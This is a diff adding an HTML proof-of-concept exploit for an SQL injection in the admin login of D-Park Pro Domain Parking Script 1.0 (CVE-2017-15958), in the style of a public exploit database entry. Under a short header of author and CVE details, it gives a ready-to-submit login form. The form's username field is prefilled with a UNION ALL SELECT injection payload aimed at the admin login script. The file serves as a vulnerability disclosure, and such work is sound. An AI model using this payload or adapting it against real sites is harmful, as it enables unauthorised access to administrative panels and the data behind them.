@@ -1,0 +1,29 @@
+<!--
+# # # # # 
+# Exploit Title: D-Park Pro Domain Parking Script 1.0 - SQL Injection
+# Dork: N/A
+# Date: 30.10.2017
+# Vendor Homepage: http://www.domainzaar.com/
+# Software Link: http://www.domainzaar.com/
+# Demo: http://www.d-park-pro.com/
+# Version: 1.0
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: CVE-2017-15958
+# # # # #
+# Exploit Author: Ihsan Sencan
+# Author Web: http://ihsan.net
+# Author Social: @ihsansencan
+# # # # #
+# Description:
+# The vulnerability allows an attacker to inject sql commands....
+# 
+# # # # #
+-->
+<form id="loginform" action="http://localhost/[PATH]/admin/loginform.php" method="post">
+<label for="form_username">Username:</label>
+<input type="text" name="username" value="' UNION ALL SELECT 0x31,0x32,0x33,CONCAT(0x494853414e2053454e43414e)-- Ver Ayari" />
+<label for="form_password">Password:</label>
+<input type="password" name="password" id="form_password" />
+<input name="login" value="Log In" type="submit">
+</form>
